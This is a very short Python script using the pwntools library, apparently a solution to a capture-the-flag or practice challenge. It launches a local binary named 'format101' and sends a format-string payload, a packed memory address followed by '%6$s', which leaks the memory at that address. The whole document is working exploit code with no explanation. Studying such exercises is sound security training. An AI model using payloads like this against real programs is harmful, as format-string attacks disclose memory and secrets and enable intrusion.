from pwn import *

p = process('./format101')
p.recv()
p.sendline('\x60\xa0\x04\x08%6$s')
print(p.recv())
